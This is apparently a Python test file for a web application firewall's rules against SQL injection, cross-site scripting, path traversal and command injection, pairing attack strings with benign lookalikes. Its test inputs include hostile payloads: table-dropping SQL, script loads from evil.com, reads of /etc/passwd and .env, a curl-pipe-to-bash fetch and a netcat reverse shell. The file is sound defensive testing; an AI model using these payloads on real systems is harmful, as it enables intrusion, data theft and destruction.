from app.security.models import InspectionLocation
from app.security.rules.command_injection import get_command_injection_rules
from app.security.rules.path_traversal import get_path_traversal_rules
from app.security.rules.sqli import get_sqli_rules
from app.security.rules.xss import get_xss_rules


def test_sqli_rules():
    """Verifies all SQL Injection rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_sqli_rules()}

    # SQLI-001: Tautologies
    assert rules["SQLI-001"].evaluate("' OR '1'='1", InspectionLocation.QUERY) is not None
    assert rules["SQLI-001"].evaluate("admin' OR 1=1--", InspectionLocation.QUERY) is not None
    assert rules["SQLI-001"].evaluate("normal query product 1", InspectionLocation.QUERY) is None

    # SQLI-002: UNION SELECT
    assert (
        rules["SQLI-002"].evaluate(
            "1 UNION SELECT username, password FROM users",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["SQLI-002"].evaluate(
            "1 UNION ALL SELECT 1, 2, 3",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["SQLI-002"].evaluate(
            "European Union trade report",
            InspectionLocation.QUERY,
        )
        is None
    )

    # SQLI-003: SQL Comments
    assert rules["SQLI-003"].evaluate("admin'--", InspectionLocation.QUERY) is not None
    assert rules["SQLI-003"].evaluate("admin'/* comment */", InspectionLocation.QUERY) is not None
    assert rules["SQLI-003"].evaluate("John's phone number", InspectionLocation.QUERY) is None

    # SQLI-004: Function Abuse
    assert rules["SQLI-004"].evaluate("1; SELECT sleep(5)", InspectionLocation.QUERY) is not None
    assert rules["SQLI-004"].evaluate("1 AND version()", InspectionLocation.QUERY) is not None
    assert (
        rules["SQLI-004"].evaluate(
            "I need to sleep early tonight",
            InspectionLocation.QUERY,
        )
        is None
    )

    # SQLI-005: Stacked Queries
    assert rules["SQLI-005"].evaluate("1; DROP TABLE users", InspectionLocation.QUERY) is not None
    assert (
        rules["SQLI-005"].evaluate(
            "1; DELETE FROM accounts",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["SQLI-005"].evaluate(
            "Please drop by tomorrow; thanks",
            InspectionLocation.QUERY,
        )
        is None
    )


def test_xss_rules():
    """Verifies all XSS rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_xss_rules()}

    # XSS-001: Script tags
    assert (
        rules["XSS-001"].evaluate(
            "<script>alert('XSS')</script>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-001"].evaluate(
            "<SCRIPT SRC=//evil.com/x.js></SCRIPT>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-001"].evaluate(
            "Mathematical: 5 < 10 and 20 > 5",
            InspectionLocation.BODY,
        )
        is None
    )

    # XSS-002: Event handlers
    assert (
        rules["XSS-002"].evaluate(
            "<img src=x onerror=alert(1)>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-002"].evaluate(
            "<svg onload=alert(1)>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-002"].evaluate(
            "We are onload balance load test",
            InspectionLocation.BODY,
        )
        is None
    )

    # XSS-003: Pseudo-protocols
    assert (
        rules["XSS-003"].evaluate(
            "javascript:alert(document.cookie)",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["XSS-003"].evaluate(
            "data:text/html;base64,PHNjcmlwdD4=",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["XSS-003"].evaluate(
            "https://example.com/javascript-tutorial",
            InspectionLocation.QUERY,
        )
        is None
    )

    # XSS-004: Dangerous DOM APIs
    assert (
        rules["XSS-004"].evaluate(
            "alert(document.cookie)",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-004"].evaluate(
            "<iframe src=http://evil.com>",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["XSS-004"].evaluate(
            "Delicious chocolate cookie recipe",
            InspectionLocation.BODY,
        )
        is None
    )


def test_path_traversal_rules():
    """Verifies all Path Traversal rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_path_traversal_rules()}

    # PATH-001: Directory Traversal
    assert (
        rules["PATH-001"].evaluate(
            "../../../etc/passwd",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-001"].evaluate(
            "..\\..\\windows\\win.ini",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-001"].evaluate(
            "/products/apple-juice.png",
            InspectionLocation.PATH,
        )
        is None
    )

    # PATH-002: OS sensitive files
    assert (
        rules["PATH-002"].evaluate(
            "/etc/passwd",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-002"].evaluate(
            "c:\\windows\\win.ini",
            InspectionLocation.PATH,
        )
        is not None
    )
    assert (
        rules["PATH-002"].evaluate(
            "/user/profile/settings",
            InspectionLocation.PATH,
        )
        is None
    )

    # PATH-003: App descriptors & credentials
    assert rules["PATH-003"].evaluate("/.env", InspectionLocation.PATH) is not None
    assert rules["PATH-003"].evaluate("WEB-INF/web.xml", InspectionLocation.PATH) is not None
    assert rules["PATH-003"].evaluate("/api/environment/status", InspectionLocation.PATH) is None


def test_command_injection_rules():
    """Verifies all Command Injection rules on positive and negative cases."""
    rules = {r.rule_id: r for r in get_command_injection_rules()}

    # CMD-001: Shell Metacharacters
    assert (
        rules["CMD-001"].evaluate(
            "127.0.0.1; whoami",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-001"].evaluate(
            "test | id",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-001"].evaluate(
            "normal text; greetings",
            InspectionLocation.QUERY,
        )
        is None
    )

    # CMD-002: Subshell & Backticks
    assert rules["CMD-002"].evaluate("$(whoami)", InspectionLocation.BODY) is not None
    assert rules["CMD-002"].evaluate("`id`", InspectionLocation.BODY) is not None
    assert (
        rules["CMD-002"].evaluate(
            "Price is $100 (who is buying?)",
            InspectionLocation.BODY,
        )
        is None
    )

    # CMD-003: Windows CLI & PowerShell
    assert (
        rules["CMD-003"].evaluate(
            "cmd.exe /c whoami",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-003"].evaluate(
            "powershell -enc AAAAAA",
            InspectionLocation.QUERY,
        )
        is not None
    )
    assert (
        rules["CMD-003"].evaluate(
            "The power of shell programming",
            InspectionLocation.QUERY,
        )
        is None
    )

    # CMD-004: Reverse Shell & Pipe
    assert (
        rules["CMD-004"].evaluate(
            "curl http://evil.com/sh | bash",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["CMD-004"].evaluate(
            "nc 10.0.0.1 4444 -e /bin/sh",
            InspectionLocation.BODY,
        )
        is not None
    )
    assert (
        rules["CMD-004"].evaluate(
            "curl is a great command line tool",
            InspectionLocation.BODY,
        )
        is None
    )
